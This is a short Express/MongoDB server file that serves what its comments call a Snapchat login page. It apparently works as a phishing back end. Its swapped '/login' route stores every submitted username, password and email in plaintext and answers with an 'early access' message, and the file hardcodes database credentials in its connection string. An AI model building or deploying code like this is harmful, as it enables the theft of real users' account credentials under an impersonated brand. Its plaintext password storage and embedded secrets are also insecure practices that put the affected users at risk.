// server.js
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const cors = require('cors');

// Create Express app
const app = express();
app.use(bodyParser.json());
app.use(cors());

// Serve static files (if using the public directory)
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Atlas connection string
const mongoURI = 'mongodb+srv://rene:red@cluster0.d5sorgc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

// Connect to MongoDB
mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Create a schema and model for User (representing Snapchat users)
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  email: String,
});

const User = mongoose.model('Snap', userSchema);

// Handle GET request to serve the HTML file (Snapchat login page)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html')); // Your HTML file (login page)
});

// Handle POST request to /login (simulate Snapchat login)
app.post('/signup', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Check if the user exists with the provided username and password
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ message: 'User not found. Please check your username or sign up.' });
    }

    // Check if the password matches
    if (user.password !== password) {
      return res.status(400).json({ message: 'Incorrect password. Please try again.' });
    }

    // If login is successful, send a response
    res.status(200).json({ message: 'Login successful. Welcome to Snapchat!' });
    
  } catch (error) {
    res.status(500).json({ message: 'Server error. Please try again later.' });
  }
});

// Handle POST request to /signup (for registering new users)
app.post('/login', async (req, res) => {
  const { username, password, email } = req.body;

  try {
    // Check if the username already exists
    const existingUser = await User.findOne({ username });
    if (existingUser) {
      return res.status(400).json({ message: 'Username already taken. Please choose another.' });
    }

    // Create and save new user
    const newUser = new User({ username, password, email });
    await newUser.save();

    res.status(201).json({ message: 'Thnkyou for registering for early access.' });
  } catch (error) {
    res.status(500).json({ message: 'Server error. Please try again later.' });
  }
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
